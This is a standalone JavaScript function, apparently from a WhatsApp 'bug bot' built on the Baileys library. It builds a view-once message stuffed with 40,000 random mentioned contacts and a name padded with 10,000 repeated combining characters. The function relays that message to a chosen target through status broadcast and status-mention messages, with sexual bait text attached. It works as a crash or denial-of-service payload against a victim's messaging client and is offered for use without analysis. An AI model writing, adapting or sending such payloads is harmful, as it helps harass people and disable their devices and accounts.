async function Protocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        "0@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".amelia modders" + "ោ៝".repeat(10000),
        title: "Devil",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const combinedMessage = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "AmeliaModders",
                    contextInfo: {
                        mentionedJid: mentionedList,
                        isSampled: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1,
                            newsletterName: "SEX INFORMATION"
                        },
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        externalAdReply: {
                            title: "amelia",
                            body: "Me want hot sek",
                            mediaType: 2,
                            thumbnailUrl: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                            mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                            sourceUrl: "https://www.bio.link/_u/yukina_",
                            showAdAttribution: true,
                            renderLargerThumbnail: true
                        },
                        annotations: [
                            {
                                embeddedContent: {
                                    embeddedMusic,
                                    stickerMetadata: {
                                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                        isAnimated: true
                                    }
                                },
                                embeddedAction: true
                            }
                        ]
                    },
                    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
                    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
                    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, combinedMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}